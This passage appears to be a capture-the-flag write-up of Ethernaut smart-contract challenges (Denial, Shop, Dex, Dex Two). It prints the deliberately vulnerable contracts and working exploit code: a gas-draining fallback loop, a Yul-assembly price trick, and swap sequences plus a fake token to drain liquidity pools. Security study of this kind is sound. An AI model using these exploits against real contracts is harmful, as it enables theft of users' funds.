    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

This challenge is similar to "9. King" challenge. We have to deny the owner from withdrawing the funds. The exploit for "King" challenge doesn't work here, That's because "call" is used instead of "transfer" to send ether. "call" doesn't propagate the errors, it just returns boolean indicating the success of the "call". so, simply reverting from fallback function doesn't solve this challenge. What we can do is consume all the available gas in the fallback function using some gas heavy operations and when the call is completed, there won't be enough gas for further operations and transaction fails because of low gas. As storage operations consume maximum gas, we can use loops to repeatedly read and write to storage.

```solidity
pragma solidity ^0.6.0;

contract DenialExploit {
    uint f;
    uint s;
    uint k;
    receive() external payable {
        for (uint i = 0; i < 10000; i++) {
            f = f + i**2;
            s = s + f;
        }
    }
}
```

### Shop

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price{gas:3300}() >= price && !isSold) {
      isSold = true;
      price = _buyer.price{gas:3300}();
    }
  }
}
```

This challenge is similar to "11. Elevator" i.e we have to return different values from the same function, based on the number of call. In this, for the first call to our "Buyer" contract's "price" function, it has to return number greater than 100 and for second call to the same function, it should return number less than 100. This challenge differs "Elevator" challenge in how much gas is forwarded for the call. While calling "price" function, "Shop" contract forwards exactly "3300" gas. $$3300$$ gas is very less to do any storage operations i.e provided gas is not enough to store a value in state variable which makes "Elevator" challenge exploit useless. Without a state variable, we have to use "Shop" contracts "isSold" variable to differentiate the calls. Note that "isSold" is changed to true between the two calls. Even if we don't use storage related operations, to complete message call to another contract with the available gas, we have to write the price function in solidity assembly "Yul" language minimizing the gas consumption.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Buyer {
    Shop public shop;
    bool public a;
    // constant variables are replaced at compile time.
    address constant shopAddress = 0xeE2Bce1C36041B5073a8420767A1e7997738cEE8;
    bytes4 constant signature = hex"e852e741";

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function price() public  returns (uint result) {

        assembly {
                let x := mload(0x40)
                result := mload(0x40)
                mstore(x, signature)
                let success := call(
                            gas(), // remaining gas
                            shopAddress, // To addr
                            0,    // No wei passed
                            x,    // Inputs are at location x
                            0x4, // Inputs size two padded, so 68 bytes
                            x,    //Store output over input
                            0x20)
                if eq(mload(x), 0) {
                    mstore(result, 100)
                }
                return(result, 0x20)
        }
    }

    function callBuy() public {
        shop.buy();
    }
}
```

### Dex

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(spender, amount);
    SwappableToken(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

Dex contract allows exchange between two ERC20 tokens. This token addresses are stored at the time of deployment and Dex allows only exchanging between these two tokens. Intially, we have 10 tokens of each token1 and token2, whereas Dex contract has 100 tokens in it's liquidity pool. Our goal is to drain all the tokens of any one token. The bug is in the "get_swap_price" function. it is calculated as

$$
swap_amount = \frac{amount * to\_balance}{from\_balance}
$$

Because of incorrect swap_amount, simple sequence of swappings will result in draining of one tokens balance

```asm
TKN1 => TKN2 => TKN1 => TKN2 => TKN1 => ...
```

### Dex Two

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract DexTwo  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_amount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_amount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(spender, amount);
    SwappableTokenTwo(token2).approve(spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
}
```

DexTwo contract is quite similar to Dex contract above. only change is that we can now exchange between any two ERC20 tokens as long as it is present in DexTwo liquidity pool. challenge is to drain both the tokens from the contract. As same get_swap_amount is used, we can use above exploit to drain one of the tokens first and then create our own fake token and repeat the same draining the balance from the remaining token.
